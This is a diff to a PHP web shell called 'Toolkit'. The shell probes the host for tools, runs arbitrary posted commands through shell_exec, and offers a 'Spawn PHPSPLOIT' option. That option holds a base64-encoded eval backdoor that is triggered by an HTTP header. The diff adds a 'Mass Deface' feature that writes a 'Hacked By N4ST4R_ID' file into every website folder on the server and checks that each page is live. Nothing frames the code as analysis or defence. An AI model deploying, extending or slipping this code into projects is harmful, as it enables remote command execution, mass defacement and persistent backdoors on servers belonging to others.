@@ -1,5 +1,7 @@
 <?php
-$dir = getcwd();
+$os = php_uname('s');
+$dir = (!preg_match("/Windows/", $os)) ? getcwd() : str_replace("\\", "/", getcwd());
+
 $curl = (function_exists('curl_version')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
 $wget = (@shell_exec('wget --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
 $perl = (@shell_exec('perl --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
@@ -10,12 +12,31 @@ $pkexec = (@shell_exec('pkexec --version')) ? "<font color='lime'>ON</font>" : "
 $disfuncs = @ini_get("disable_functions");
 $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
 
-function doFile($name, $content, $type) {
+function doFile($name, $content, $type)
+{
     $open = fopen($name, $type);
     $write = fwrite($open, $content);
     fclose($open);
 
     return ($write !== false) ? true : false;
+}
+
+function request($url)
+{
+    $context = stream_context_create([
+        "ssl" => [
+            "verify_peer" => false,
+            "verify_peer_name" => false,
+        ],
+    ]);
+
+    $url = (!preg_match("/http:\/\//", $url) || !preg_match("/https:\/\//", $url)) ? "http://$url" : $url;
+    $request = @file_get_contents($url, false, $context);
+
+    return [
+        "success" => ($request !== false) ? "1" : "0",
+        "content" => $request
+    ];
 }
 ?>
 
@@ -26,7 +47,7 @@ function doFile($name, $content, $type) {
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Toolkit</title>
     <style>
         body {
             background-color: #333333;
@@ -41,7 +62,8 @@ function doFile($name, $content, $type) {
 
         a:hover {
             text-decoration: underline;
-            text-underline-offset: 2px;
+            text-underline-offset: 5px;
+            color: #fff;
         }
 
         .terminal {
@@ -53,6 +75,16 @@ function doFile($name, $content, $type) {
             max-width: 550px;
             height: 250px;
             margin-top: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        input {
+            margin-bottom: 7px;
+            padding: 3px;
         }
     </style>
 </head>
@@ -165,14 +197,75 @@ function doFile($name, $content, $type) {
         }
     } elseif (isset($_GET["cmd"])) {
         ?>
+
         <form method='post'>
             <label for='cmd'>Command: </label>
             <input type='text' name='cmd' id='cmd' autocomplete='off'>
             <input type='submit' name='exec' value='Exec'>
         </form>
-    <?php
+
+        <?php
         if (isset($_POST["exec"])) {
             echo "<textarea class='terminal' disabled>" . @shell_exec($_POST["cmd"]) . "</textarea>";
+        }
+    } elseif (isset($_GET["mass"])) {
+        if (isset($_POST["mass"])) {
+            $from = $_POST["from"];
+            $dest = $_POST["dest"];
+            $filename = $_POST["filename"];
+            $script = $_POST["script"];
+            $scandir = scandir($from);
+
+            $results = [
+                "websites" => [],
+                "folders" => []
+            ];
+
+            foreach ($scandir as $folder) {
+                if ($folder == ".." || $folder == "." || !is_dir($folder)) continue;
+
+                $savefile = (!empty($dest)) ? "$from/$folder/$dest/$filename" : "$from/$folder/$filename";
+                $save = doFile($savefile, $script, "w");
+
+                if ($save) {
+                    $request = request($folder);
+
+                    if ($request["success"] == "1") {
+                        $results["websites"][] = "<a href='http://$folder/$filename'>$folder/$filename</a>";
+                    } else {
+                        $results["folders"][] = "$folder/$filename";
+                    }
+                }
+            }
+
+            if (!empty($results["websites"]) && !empty($results["folders"])) {
+                $websites = implode("<br>", $results["websites"]);
+                $folders = implode("<br>", $results["folders"]);
+
+                echo "Websites:<br>";
+                echo "$websites<br>";
+
+                echo "<br>Folders:<br>";
+                echo "$folders<br>";
+            } else {
+                echo "Mass Deface failed";
+            }
+        } else {
+        ?>
+
+            <form method="post">
+                <label for="from">From: </label>
+                <input type="text" name="from" id="from" value="<?= $dir; ?>"><br>
+                <label for="dest">Additional Destination (optional): </label>
+                <input type="text" name="dest" id="dest" placeholder="public_html"><br>
+                <label for="filename">Filename: </label>
+                <input type="text" name="filename" id="filename" value="nax.txt"><br>
+                <label for="script">Script: </label>
+                <textarea name="script" id="script" cols="40" rows="12">Hacked By N4ST4R_ID</textarea><br>
+                <input type="submit" name="mass" value="Submit">
+            </form>
+
+    <?php
         }
     } elseif (isset($_GET["phpsploit"])) {
         $content = "PD9waHAgQGV2YWwoJF9TRVJWRVJbJ0hUVFBfUEhQU1BMMDFUJ10pOyA/Pg==";
@@ -188,10 +281,10 @@ function doFile($name, $content, $type) {
     ?>
 
     <div style=" margin-top: 10px;">
-        <a href="?">Home</a>
-        <a href="?cmd">Terminal</a>
-        <a href="?network">Network</a>
-        <a href="?mass">Mass Deface</a>
+        <a href="?">Home</a> |
+        <a href="?cmd">Terminal</a> |
+        <a href="?network">Network</a> |
+        <a href="?mass">Mass Deface</a> |
         <a href="?phpsploit">Spawn PHPSPLOIT</a>
     </div>
 </body>
